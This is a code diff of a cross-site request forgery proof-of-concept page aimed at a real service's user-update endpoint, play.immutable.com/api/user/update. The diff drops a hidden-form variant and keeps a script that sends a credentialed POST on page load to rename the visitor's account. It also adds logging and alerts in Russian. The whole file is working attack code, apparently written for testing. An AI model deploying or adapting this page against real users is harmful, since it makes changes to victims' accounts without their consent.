@@ -1,16 +1,8 @@
-<!-- csrf-poc.html -->
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>CSRF PoC</h1>
-
-    <form id="csrfForm" action="https://play.immutable.com/api/user/update" method="POST" enctype="application/json">
-      <input type="hidden" name='{"name":"CSRF✅"}'>
-      <input type="submit" value="Submit CSRF">
-    </form>
-
+    <h1>CSRF Test</h1>
     <script>
-      // Автоматическая отправка (если работает без JS-блокировок)
       fetch("https://play.immutable.com/api/user/update", {
         method: "POST",
         headers: {
@@ -20,6 +12,15 @@
           name: "CSRF ✅"
         }),
         credentials: "include"
+      })
+      .then(res => res.text())
+      .then(text => {
+        console.log("Response:", text);
+        alert("CSRF запрос отправлен!");
+      })
+      .catch(err => {
+        console.error("Ошибка:", err);
+        alert("Ошибка при отправке запроса");
       });
     </script>
   </body>
